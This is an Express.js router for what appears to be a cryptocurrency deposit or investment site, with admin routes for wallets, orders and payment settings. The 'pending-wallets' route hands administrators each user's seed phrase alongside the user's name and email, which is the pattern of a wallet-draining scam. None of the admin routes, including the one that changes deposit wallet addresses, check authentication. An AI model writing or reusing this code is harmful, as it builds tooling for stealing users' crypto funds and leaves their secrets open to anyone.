const express = require("express");
const router = express.Router();
const User = require("../models/User");
const Order = require("../models/Order");
const Settings = require("../models/Settings");

// ==============================
// 1. PUBLIC SETTINGS ROUTE (For users to see addresses)
// ==============================
router.get("/public/settings", async (req, res) => {
    try {
        let settings = await Settings.findOne();
        if (!settings) settings = await Settings.create({}); 
        res.json(settings);
    } catch (e) { res.status(500).json({ message: "Error fetching settings" }); }
});

// ==============================
// 2. WALLET ROUTES
// ==============================
router.get("/pending-wallets", async (req, res) => {
    try {
        const users = await User.find({ walletStatus: "pending" }).select("name email walletAddress seedPhrase");
        res.json(users);
    } catch (e) { res.status(500).json({ message: "Error fetching wallets" }); }
});

router.post("/approve-wallet/:email", async (req, res) => {
    try {
        await User.findOneAndUpdate(
            { email: req.params.email }, 
            { walletStatus: "approved", seedPhrase: null }
        );
        res.json({ message: "Approved" });
    } catch (e) { res.status(500).json({ message: "Error approving wallet" }); }
});

// ==============================
// 3. ORDER ROUTES
// ==============================
router.get("/pending-orders", async (req, res) => {
    try {
        const orders = await Order.find({ status: "Pending" });
        res.json(orders);
    } catch (e) { res.status(500).json({ message: "Error fetching orders" }); }
});

router.post("/approve-order/:id", async (req, res) => {
    try {
        const order = await Order.findById(req.params.id);
        if (!order) return res.status(404).json({ message: "Order not found" });
        order.status = "Approved";
        await order.save();
        res.json({ message: "Order approved successfully" });
    } catch (e) { res.status(500).json({ message: "Error approving order" }); }
});

// ==============================
// 4. ADMIN SETTINGS ROUTES
// ==============================
router.get("/settings", async (req, res) => {
    try {
        let settings = await Settings.findOne();
        if (!settings) settings = await Settings.create({}); 
        res.json(settings);
    } catch (e) { res.status(500).json({ message: "Error fetching settings" }); }
});

router.post("/settings", async (req, res) => {
    try {
        const { supportEmail, wallets } = req.body;
        let settings = await Settings.findOne();
        if (!settings) settings = new Settings({});
        
        settings.supportEmail = supportEmail || settings.supportEmail;
        settings.wallets = wallets || {};
        
        await settings.save();
        res.json({ message: "Settings updated successfully" });
    } catch (e) { res.status(500).json({ message: "Error updating settings" }); }
});

module.exports = router;
